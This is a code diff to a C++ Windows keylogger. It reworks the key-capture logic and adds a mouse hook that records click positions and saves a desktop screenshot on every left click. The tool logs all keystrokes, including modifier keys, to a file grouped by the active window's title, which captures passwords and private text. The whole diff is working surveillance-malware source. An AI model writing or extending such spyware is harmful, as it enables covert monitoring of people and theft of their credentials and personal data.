@@ -19,14 +19,15 @@ KeyLogger::KeyLogger(std::string _logFilePath) {
 
 KeyLogger::~KeyLogger() {
     logFile.close();
-    UnhookWindowsHookEx(hook);
+	UnhookWindowsHookEx(khook);
+	UnhookWindowsHookEx(mhook);
 }
 
 KeyLogger* KeyLogger::getInstance() {
 
     if(instance == NULL) {
         instance = new KeyLogger();
-    }
+	 }
 
     return instance;
 }
@@ -45,6 +46,7 @@ LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
 
     if (nCode >= 0) {
 
+		//key pressed
         if(wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
 
             KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*) lParam);
@@ -53,33 +55,33 @@ LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
 
                 case SC_LSHIFT:
 					if (!keylogger->lshiftDown) {
-						keylogger->lshiftDown = true;
-						keylogger->keyboardBuffer += "<LSHIFT>";
+						keylogger->setLShiftDown(true);
+						keylogger->log("<LSHIFT>");
 					}
                     break;
                 case SC_RSHIFT:
 					if (!keylogger->rshiftDown) {
-						keylogger->rshiftDown = true;
-						keylogger->keyboardBuffer += "<RSHIFT>";
+						keylogger->setRShiftDown(true);
+						keylogger->log("<RSHIFT>");
 					}
                     break;
                 case SC_ALT:
 					if (!keylogger->altDown) {
-						keylogger->altDown = true;
-						keylogger->keyboardBuffer += "<ALT>";
+						keylogger->setAltDown(true);
+						keylogger->log("<ALT>");
 					}
                     break;
                 case SC_CTRL:
 					if (!keylogger->ctrlDown) {
-						keylogger->ctrlDown = true;
-						keylogger->keyboardBuffer += "<CTRL>";
+						keylogger->setCtrlDown(true);
+						keylogger->log("<CTRL>");
 					}
                     break;
 				case SC_SPACE:
-					keylogger->keyboardBuffer += " ";
+					keylogger->log(" ");
 					break;
 				case SC_ENTER:
-					keylogger->keyboardBuffer += "[ENTER]\n";
+					keylogger->log("<ENTER>\n");
 					break;
                 default:
                     DWORD key = 1;
@@ -91,6 +93,7 @@ LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
             }
         }
 
+		//key released
         if(wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
 
             KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*) lParam);
@@ -98,28 +101,47 @@ LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
             switch(hooked.scanCode) {
 
                 case SC_LSHIFT:
-					keylogger->lshiftDown = false;
-					keylogger->keyboardBuffer += "</LSHIFT>";
+					keylogger->setLShiftDown(false);
+					keylogger->log("</LSHIFT>");
                     break;
                 case SC_RSHIFT:
-					keylogger->rshiftDown = false;
-					keylogger->keyboardBuffer += "</RSHIFT>";
+					keylogger->setRShiftDown(false);
+					keylogger->log("</RSHIFT>");
                     break;
                 case SC_ALT:
-					keylogger->altDown = false;
-					keylogger->keyboardBuffer += "</ALT>";
+					keylogger->setAltDown(false);
+					keylogger->log("</ALT>");
                     break;
                 case SC_CTRL:
-					keylogger->altDown = false;
-					keylogger->keyboardBuffer += "</CTRL>";
+					keylogger->setCtrlDown(false);
+					keylogger->log("</CTRL>");
                     break;
                 default:
                     break;
             }
         }
+
+		//mouse clicked
+		if (wParam == WM_LBUTTONDOWN) {
+
+			MSLLHOOKSTRUCT hooked = *((MSLLHOOKSTRUCT*)lParam);
+			std::stringstream logStr;
+			logStr << "<LMOUSE (" << hooked.pt.x << ", " << hooked.pt.y << ") >\n";
+			keylogger->log(logStr.str());
+			keylogger->screenshot();
+		}
+
     }
 
-	return CallNextHookEx(keylogger->getHook(), nCode, wParam, lParam);
+	return CallNextHookEx(keylogger->khook, nCode, wParam, lParam);
+}
+
+void KeyLogger::screenshot() {
+	std::stringstream fileName;
+	fileName << time(NULL) << ".bmp";
+	takeScreenshot(GetDesktopWindow(), fileName.str());
+
+	log("<SCREENSHOT " + fileName.str() + ">\n");
 }
 
 void KeyLogger::listen() {
@@ -128,8 +150,10 @@ void KeyLogger::listen() {
 	if (!instance) {
 		exit(1);
 	}
-
-	hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookFunction, instance, 0);
+	
+	//setup keyboard and mouse hooks
+	khook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookFunction, instance, 0);
+	mhook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)hookFunction, instance, 0);
 
 	logFile.open(logFilePath.c_str(), ios::app);
 
@@ -142,15 +166,19 @@ void KeyLogger::listen() {
 
 void KeyLogger::log(std::string text) {
 	
+	//user switched windows
 	if (getActiveWindowTitle() != activeWindowTitle) {
-		logFile << getTimeString() << endl <<
-			activeWindowTitle << endl << "============================" << endl <<
-			keyboardBuffer << endl << "============================" << endl << endl;
-		activeWindowTitle = getActiveWindowTitle();
-		keyboardBuffer = "";
+		writeBuffer();//dump last window's information to file
 	}
 
 	keyboardBuffer += text;
+}
+
+void KeyLogger::writeBuffer()
+{
+	logFile << getTimeString() << endl << activeWindowTitle << endl << "===============================" << endl << keyboardBuffer << endl << "===============================" << endl << endl;
+	 activeWindowTitle = getActiveWindowTitle();
+	 keyboardBuffer = "";
 }
 
 std::string KeyLogger::getTimeString() {
@@ -170,8 +198,6 @@ std::string KeyLogger::getActiveWindowTitle() {
     GetWindowText(hwnd, title, sizeof(title));
     return std::string(title);
 }
-
-HHOOK KeyLogger::getHook() { return hook; }
 
 bool KeyLogger::isAltDown() { return altDown; }
 
